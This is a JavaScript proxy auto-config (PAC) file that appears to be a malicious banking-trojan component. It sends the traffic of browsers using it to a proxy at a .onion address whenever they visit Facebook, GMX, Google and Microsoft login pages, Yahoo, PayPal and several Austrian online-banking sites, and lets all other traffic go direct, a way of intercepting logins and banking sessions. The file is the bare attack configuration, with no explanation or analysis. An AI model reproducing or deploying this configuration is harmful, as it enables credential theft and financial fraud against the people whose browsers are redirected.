function FindProxyForURL(url, host) {
    var proxy = "PROXY r7t6zvhfwph5f6d5.onion:88;";
    var hosts = new Array('*.facebook.com', '*.gmx.at', '*.gmx.ch', '*.gmx.com',
        '*.gmx.de', '*.gmx.net', 'accounts.google.com', 'mail.google.com',
        'login.live.com', 'login.yahoo.com', '*.paypal.com',
        '*.bankaustria.at', '*.bawagpsk.com', '*.raiffeisen.at',
        '*.bawag.com', 'www.banking.co.at', '*oberbank.at',
        'www.oberbank-banking.at', '*.easybank.at');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
